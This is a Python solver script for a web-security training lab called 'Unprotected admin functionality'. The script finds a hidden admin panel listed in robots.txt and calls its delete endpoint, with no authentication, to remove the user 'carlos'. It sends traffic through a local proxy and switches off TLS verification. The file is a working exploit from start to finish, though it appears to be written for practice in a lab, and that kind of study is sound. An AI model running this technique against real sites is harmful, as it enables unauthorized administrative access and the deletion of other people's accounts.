# Unprotected admin functionality

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_robots_txt(s, url):
	robots_path = url + '/robots.txt'
	r = s.get(robots_path)
	if r.status_code == 200:
		admin_panel = re.search(b'\nDisallow: (.*)\n', r.text.encode()).group(1)
		print(f'[+] Found robots.txt:\n{r.text}')
		return admin_panel.decode()
	else:
		print('[-] Failed to find robots.txt file <!>')

def delete_carlos(s, url, path):
	admin_panel_path = url + path
	r = s.get(admin_panel_path)
	if r.status_code == 200:
		print('\n[+] Admin panel found !')
		delete_path = admin_panel_path + '/delete'
		delete_data = {'username': 'carlos'}
		print('[+] Trying to delete Carlos user...')
		r = s.get(delete_path, data=delete_data)
		if r.status_code == 200:
			print('[+] Carlos user successfully deleted !')
		else:
			print('[-] Failed to delete Carlos user <!>')
	else:
		print('[-] Failed to find admin panel <!>')

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Unprotected admin functionality')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected Paths to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			print('[+] Trying to find robots.txt file in the root directory...\n')
			path = get_robots_txt(s, url)
			time.sleep(2)
			r = delete_carlos(s, url, path)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
